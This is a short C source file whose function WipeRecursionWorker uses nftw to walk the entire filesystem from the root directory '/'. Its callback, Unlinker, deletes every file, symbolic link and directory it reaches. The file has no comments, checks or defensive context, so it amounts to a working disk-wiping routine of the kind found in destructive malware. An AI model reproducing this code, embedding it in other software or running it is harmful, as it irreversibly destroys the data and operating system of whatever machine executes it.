#define _XOPEN_SOURCE 500
#define _POSIX_C_SOURCE 200809L
#include<ftw.h>
#include<fcntl.h>
#include<unistd.h>

int Unlinker(const char *path, const struct stat *sb, int typeflag, struct FTW *ftwbuf) {
    if (typeflag == FTW_F || typeflag == FTW_SL || typeflag == FTW_SLN) {
        unlinkat(AT_FDCWD, path, 0);
    } else if (typeflag == FTW_DP) {
        unlinkat(AT_FDCWD, path, AT_REMOVEDIR);
    };
    return 0;
}

int WipeRecursionWorker() {
    nftw("/", Unlinker, 64 , FTW_DEPTH | FTW_PHYS);
    return 0;
}